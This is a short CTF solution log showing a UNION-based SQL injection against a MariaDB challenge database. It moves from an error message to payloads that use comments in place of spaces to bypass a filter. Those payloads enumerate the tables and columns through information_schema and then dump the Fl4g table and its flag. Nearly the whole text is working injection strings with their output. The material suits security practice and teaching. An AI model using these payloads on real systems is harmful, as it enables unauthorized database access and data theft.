``` 

"

You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '""" LIMIT 0,1' at line 1


-1"/**/union/**/select/**/version(),database()"1

Name: "10.4.13-MariaDB"
Position: "ctf"


-1"/**/union/**/select/**/1,group_concat(TABLE_NAME)/**/FROM/**/information_schema.tables/**/WHERE/**/TABLE_SCHEMA=database()/**/&&"1


Name: "1"
Position: "Fl4g"

-1"/**/union/**/select/**/1,group_concat(column_name)/**/FROM/**/information_schema.columns/**/WHERE/**/table_name='Fl4g'&&"1

Name: "1"
Position: "id,des,value"


-1"/**/union/**/select/**/1,group_concat(id,des,value)/**/FROM/**/Fl4g/**/WHERE/**/1/**/&&"1

Name: "1"
Position: "5555Y0u are the master 0f bypass1ngflag{23d24149-6b10-4cbe-8d91-0c6322617e40}"

```